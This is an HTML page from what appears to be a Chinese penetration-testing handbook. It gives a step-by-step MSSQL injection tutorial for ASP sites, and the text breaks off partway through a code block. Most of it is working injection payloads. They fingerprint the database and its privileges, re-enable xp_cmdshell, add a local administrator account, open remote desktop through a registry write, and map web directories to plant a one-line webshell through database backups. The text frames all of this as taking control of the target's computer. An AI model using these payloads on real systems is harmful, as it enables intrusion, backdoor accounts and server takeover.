@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MSSQL Database Injection - MSSQL数据库注入 | 烟雨黑帽</title>
+<meta name="description" content="msSQL数据库注入： 参考：***.com 介绍一下基于ASP+MsSQL环境下的注入攻击技术。 第一步：注入点类型的判断 首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点 第二…">
+<meta name="keywords" content="MSSQL Database Injection, MSSQL数据库注入, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="noahs">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="MSSQL Database Injection">
+<meta property="og:description" content="msSQL数据库注入： 参考：***.com 介绍一下基于ASP+MsSQL环境下的注入攻击技术。 第一步：注入点类型的判断 首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点 第二…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="MSSQL Database Injection">
+<meta name="twitter:description" content="msSQL数据库注入： 参考：***.com 介绍一下基于ASP+MsSQL环境下的注入攻击技术。 第一步：注入点类型的判断 首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点 第二…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "MSSQL数据库注入"}]}, {"@type": "TechArticle", "headline": "MSSQL Database Injection", "alternativeHeadline": "MSSQL数据库注入", "description": "msSQL数据库注入： 参考：***.com 介绍一下基于ASP+MsSQL环境下的注入攻击技术。 第一步：注入点类型的判断 首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点 第二…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "noahs"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1 active"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>MSSQL数据库注入</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>MSSQL数据库注入</h1><p class="cn-title">MSSQL Database Injection</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#_1">第一步：注入点类型的判断</a></li>
+<li><a href="#_2">第二步：获取当前系统用户名</a></li>
+<li><a href="#_3">第三步：判断注入点权限</a></li>
+<li><a href="#mssql">第四步：MsSQL返回信息判断</a></li>
+<li><a href="#mssql_1">第五步：利用MsSQL扩展存储注入攻击</a><ul>
+<li><a href="#_4">攻击中最常利用的扩展存储</a></li>
+</ul>
+</li>
+<li><a href="#sa3389">第六步：SA权限下扩展存储攻击利用方法→3389远程终端</a></li>
+<li><a href="#dbowner">第七步：dbowner 权限利用方法（ ）</a><ul>
+<li><a href="#1">1.找出网站安装路径：</a></li>
+<li><a href="#2">2.获取数据库用户名</a></li>
+<li><a href="#3">3.写入一句话木马：</a></li>
+</ul>
+</li>
+<li><a href="#public">第八步：public权限利用方法</a></li>
+</ul>
+</div>
+</details><div class="article-body"><p>msSQL数据库注入：
+参考：***.com
+介绍一下基于ASP+MsSQL环境下的注入攻击技术。</p>
+<h2 id="_1">第一步：注入点类型的判断</h2>
+<p>首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点</p>
+<pre><code class="language-sql"># 如果页面返回正常，则说明为MsSQL注入点。
+and exists (select * from sysobjects) &gt;0
+</code></pre>
+<h2 id="_2">第二步：获取当前系统用户名</h2>
+<pre><code class="language-sql">and system_user=0
+# system_user是查询当前数据库系统的用户名，是字符型,与整型数据进行对比时,类型不匹配会造成数据库报错。
+# 从返回的错误信息中，可得知当前系统用户名。（如果不行，换个浏览器试试可能就成功了）
+</code></pre>
+<h2 id="_3">第三步：判断注入点权限</h2>
+<pre><code class="language-sql">and 1=(select is_srvrolemember('sysadmin'))
+and 1=(select is_srvrolemember('db_owner'))
+and 1=(select is_srvrolemember('public'))
+
+如果查询返回正常页面，则说明当前数据库用户具有sa、db_owner、public权限，
+sa为数据库用户中最高权限，默认也是系统权限，对服务器安全威胁是相当高的。
+如果数据库与Web服务器是同一个，默认情况下可以通过MsSQL自带的存储过程对整个服务器进行控制。
+db_owner 权限的话，我们可以找到WEB的路径，然后用备份的方式得到webshell，有时也可以对注册表进行操作。
+public 权限的话，又要面对表和列了，不过MSSQL比ACCESS的“猜”表方便许多，这里是“暴”表，使目标直接暴出来。
+如果权限不足，可通过注入点猜解数据库内容获得管理员账号。
+</code></pre>
+<h2 id="mssql">第四步：MsSQL返回信息判断</h2>
+<pre><code class="language-sql">and @@version&gt;0
+# 从页面返回的错误信息中，可以得到数据库版本信息。
+# 如果页面出错，但未返回可利用的信息，则说明MsSQL关闭了错误信息提示，
+# 在猜解数据库内容时，就不能用爆库的方法了，只能使用union select联合查询或盲注入攻击方法。
+
+# 如下查询检测，获得更多的关于MsSQL注入点的信息。
+## 判断MsSQL支持多行语句查询
+;declare @d int 
+# 是否支持子查询
+and (select count (1) from [sysobjects])&gt;=0
+# 获取当前数据库用户名
+and user&gt;O
+# 获取当前数据库名称
+and db_name&gt;0
+# 当前数据库名
+and l=convert (int,db_name ()) 或 1=(select db_name ())
+# 本地服务名
+and 1=(select @@servername)
+# 判断是否有库读取权限
+and 1=(Select HAS_DBACCESS ('master'))
+</code></pre>
+<h2 id="mssql_1">第五步：利用MsSQL扩展存储注入攻击</h2>
+<p>扩展存储过程是MsSQL提供的特殊功能。
+所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能.
+MsSQL利用扩展存储可以实现许多强大的功能，包括对系统进行操作.利用这个特性，在实施MsSQL注入攻击时，可以更容易地对系统进行控制。</p>
+<p>xp_cmdshell是什么？
+答：SQL中运行系统命令行的系统存储过程，一般在安全级别较高的服务器上，建议关闭或限制访问权限。</p>
+<p>可以使用外围应用配置器工具以及通过执行 sp_configure 来启用和禁用 xp_cmdshell。</p>
+<pre><code class="language-sql"># 提交如下查询进行检测。查看xp_cmdshell、xp_regread扩展存储过程是否被删除。
+and 1=(Select count(*) FROM master. dbo.sysobjects  Where xtype ='X' AND name = 'xp_cmdshell')
+and 1=(Select count(*) FROM master. dbo.sysobjects  Where name = 'xp_regread')
+
+#如果扩展存储被删除，可执行如下查询进行恢复。
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
+
+## 或者以下一系列语句：
+;EXEC sp_configure 'show advanced options', 1 --
+;RECONFIGURE WITH OVERRIDE --
+;EXEC sp_configure 'xp_cmdshell', 1 --
+;RECONFIGURE WITH OVERRIDE --
+;EXEC sp_configure 'show advanced options', 0 --
+</code></pre>
+<h3 id="_4">攻击中最常利用的扩展存储</h3>
+<p>xp_cmdshell—利用此存储过程可以直接执行系统命令。
+xp_regread—利用此存储过程可以进行注册表读取。
+xp_regwrit一利用此存储过程可以写入注册表。
+xp_dirtre一利用此存储过程可以进行列目录操作。
+xp_enumds—利用此存储过程可以进行ODBC连接。
+xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。
+xp_makecab一一利用此存储过程可以创建压缩卷。
+xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。
+xp_terminate_jroces一利用此存储过程可以查看终端进程，给出一个进程PID.
+结合上面的这些扩展存储，通过提交精心构造的查询语句，可利用扩展存储的强大功能进行攻击。</p>
+<h2 id="sa3389">第六步：SA权限下扩展存储攻击利用方法→3389远程终端</h2>
+<p>SA权限判断</p>
+<pre><code class="language-sql">and 1=(select IS_SRVROLEMEMBER('sysadmin'))
+````
+利用扩展存储开启远程终端步骤：
+
+```sql
+# 1.添加账号：
+;exec master..xp_cmdshell 'net user test test /add'
+# 2.提权账号：加入admin组
+;exec master..xp_cmdshell 'net localgroup administrators test /add'
+# 3.开启3389端口：不报错就表示成功
+;execmaster.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
+# 4.链接3389端口控制对方的电脑
+输入目标的IP，账号密码就是test，连接成功后退出的话点击断开，不要关机。
+</code></pre>
+<p>⛔sa权限下，还有如下几种方法都可以获得目标的webshell。
+* 利用 xp_regwrite 操作注册表与开启沙盒模式
+* 利用 sp_makewebtask 写入一句话木马
+* 利用 sp_oacreate 存储远程下载文件
+* 利用 sp_addlogin 扩展管理数据库用户
+* 利用 xp_servicecontrol 管理服务</p>
+<h2 id="dbowner">第七步：dbowner 权限利用方法（ ）</h2>
+<p>dbowner权限判断</p>
+<pre><code class="language-sql">and 1=(SELECT IS_MEMBER('db_owner'));--
+</code></pre>
+<p>⛔当数据库连接账户为dbowner权限时，无法直接利用扩展存储执行各种系统命令，进行攻击的过程比较烦琐。
+1. 通常首先利用xp_dirtree扩展存储列出Web目录，
+2. 然后利用SQL语句创建一个临时表，插入一句话木马到临时表中。
+3. 然后利用数据库备份语句，将数据库备份到Web目录并保存为ASP格式的文件，即可得到一个一句话木马后门。
+4. 最后利用一句话木马客户端连接后门，得到WebShell后就可以控制整个服务器了。</p>
+<p>🔰db_owner目前公开的方法主要有五种：
+第一种：就是最普遍的backup，现在利用差异备份生成的asp文件确实要比以前小拉不少，但能否得到webshell，目前成功率还不是很高。
+第二种：就是在下的万能提权，此法成功率几乎为零，只有在特定的条件下面才能实现。
+第三种：就是LCX大牛在《MSSQLdb_owner角色注入直接获得系统权限》所说的利用xp_regread读出VNC在注册表的加密密码，然后破解，直接拿到系统权限，这种方法局限性比较大，要是对方主机没有装vnc，你怎么办。
+第四种：就是利用xp_regwrite再注册表里直接加个系统帐号或者直接写个webshell，在主机重起的时候就可以拿到webshell或者系统权限。此法适用范围比较大，成功率也相对前3种较高点，但缺点也是显而易见的，就是不能够马上得到webshell，需要对方重起。
+第五种：就是利用添加作业的一些存储过程，sp_add_job，sp_addtask，xp_dirtree之类得到系统权限。理论上应该说是目前这5种里面成功率最高的的一种，</p>
+<p>下面我们就重点介绍一下第五种方法。</p>
+<h3 id="1">1.找出网站安装路径：</h3>
+<p>当Web服务器与数据库在同一服务器主机上时，就可以备份一句话木马到Web目录了。但是在备份一句话木马前，首先需要搜索Web目录，可通过如下几个步骤实现。
+第壹种方法：通过报错或baidu、google等查找
+第贰种方法：这种方法需要满足三个条件，可以获取目标的所有盘符和深度
+1. SQL SERVER允许执行多行语句；
+2. 该网站能进行注入；
+3. 没有返回详细的错误提示信息(否则没有必要用这种方法)。</p>
+<pre><code class="language-sql"># 1. 删除表black；首先建立一个临时表用于存放master..xp_dirtree(适合于public)生成的目录树 ，该表的dir字段表示目录的名称，depth字段表示目录的深度。
+;drop table black;create table temp(dir nvarchar (255), depth varchar(255),files varchar(255), id int not null identity (1,1))--
+# 2. 然后执行xp_dirtree获得D盘的目录树
+;insert into temp(dir,depth,files) exec master.dbo.xp_dirtree 'D:',1,1--
+# 3. 查看D盘有几个文件夹，这样对D盘有个大致的了解
+and (select count(*) from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷'))&gt;=数字(数字=0、1、2、3...)
+# 4. 接着在对方的网站上找几个一级子目录，如user、photo，然后，用筛选的方法来判断WEB根目录上是否存在此盘上
+## 看语句的返回结果，如果为真，表示WEB根目录有可能在此盘上
+and (select count(*) from temp where  dir&lt;&gt;'user')&lt;(select count(*) from temp)
+and (select count(*) from temp where dir&lt;&gt;'photo')&lt;(select count(*) from temp)
+# 5. 假设找到的WEB根目录在此盘上，用下面的语句来获得一级子目录的深度：
+## 假设得到的depth是3,说明user目录是D盘的3级目录，则WEB根目录是D盘的二级目录。
+and (select depth from temp where dir='user')&gt;=数字  #数字=1、2、3...
+# 6. 接下来，另建一个临时表temp1，用来存放D盘的1级子目录下的所有目录
+;create table temp1(dir nvarchar(255),depth varchar(255));--
+# 7. 然后把从D盘的第一个子目录下的所有目录存到temp1中
+declare @dirname varchar(255);set @dirname='D:/'+(select top 1 dir from (select top 1 dir from temp where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp1 exec master.dbo.xp_dirtree @dirname
